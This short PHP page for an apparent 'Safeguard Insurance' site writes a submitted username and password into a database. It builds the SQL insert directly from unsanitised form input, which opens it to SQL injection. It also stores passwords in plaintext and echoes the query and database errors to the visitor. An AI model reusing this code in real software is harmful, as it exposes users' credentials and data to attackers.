<!DOCTYPE html>
<html>
    <head>
        <title>Safeguard Insurance</title>
    </head>

    <body>
        <?php
        require_once 'config.php';

        if($_SERVER["REQUEST_METHOD"] == "POST")
        {
            $username = $_POST['username'];
            $password = $_POST['password'];
            

            $sql = "INSERT INTO login (username, password) VALUES ('$username', '$password')";

            
            if ($conn->query($sql) === TRUE)
            {
                echo "Request Submitted.!";
            }

            else
            {
                echo "Error: " . $sql . "<br>" . $conn->error; 
            }
        }

        $conn->close();
        ?>
        </div>
    </body>
    </html>